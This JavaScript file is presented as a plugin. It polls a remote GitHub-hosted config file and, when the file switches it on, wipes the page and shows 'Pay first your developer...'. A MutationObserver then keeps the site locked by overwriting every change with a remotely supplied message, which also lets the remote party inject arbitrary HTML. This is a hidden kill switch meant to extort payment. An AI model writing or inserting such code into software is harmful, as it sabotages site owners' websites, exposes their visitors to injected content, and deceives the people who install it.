(function() {
    function fetchConfig(callback) {
        // Updated URL with your GitHub details
        const configUrl = 'https://raw.githubusercontent.com/seankapri1/amazingusefulsites/main/config.json';
        
        fetch(configUrl + '?t=' + Date.now())
            .then(response => response.json())
            .then(config => callback(config))
            .catch(error => console.error('Plugin error:', error));
    }

    function runPlugin() {
        fetchConfig(function(config) {
            if (config.enabled) {
                // Replace body content immediately
                document.body.innerHTML = '<h1 style="padding: 50px; text-align: center; color: red;">Pay first your developer...</h1>';
                
                // Block future DOM changes
                const observer = new MutationObserver(() => {
                    document.body.innerHTML = config.message || 'Payment required';
                });
                observer.observe(document.body, { childList: true, subtree: true });
            }
        });
    }

    // Instant activation with periodic checks (every 5 minutes)
    runPlugin();
    setInterval(runPlugin, 300000);
})();
